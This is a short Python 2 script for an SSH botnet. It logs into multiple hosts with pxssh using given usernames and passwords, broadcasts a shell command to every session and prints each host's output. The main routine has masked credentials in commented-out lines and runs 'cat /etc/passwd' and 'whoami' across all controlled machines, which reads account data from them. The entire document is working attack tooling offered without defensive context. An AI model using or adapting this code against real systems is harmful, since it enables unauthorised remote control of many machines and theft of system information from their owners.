#!/usr/bin/python

import optparse
import pxssh

botNet = []

class Client:
  def __init__(self, host, user, password):
    self.host = host
    self.user = user
    self.password = password
    self.session = self.connect()

  def connect(self):
    try:
      s = pxssh.pxssh()
      s.login(self.host, self.user, self.password)
      return s
    except Exception,e:
      print e
      print '[-]Error Connecting'

  def send_command(self, cmd):
    self.session.sendline(cmd)
    self.session.prompt()
    return self.session.before

def botnetcommand(cmd):
  for client in botNet:
    output = client.send_command(cmd)
    print '[*] Output from ' + client.host
    print '[+] ' + output

def addClient(host, user, password):
  global botNet
  client = Client(host,user,password)
  botNet.append(client)

def main():
 # addClient('****','*','********')
 # addClient('****','*','********')

  botnetcommand('cat /etc/passwd')
  botnetcommand('whoami')


main()
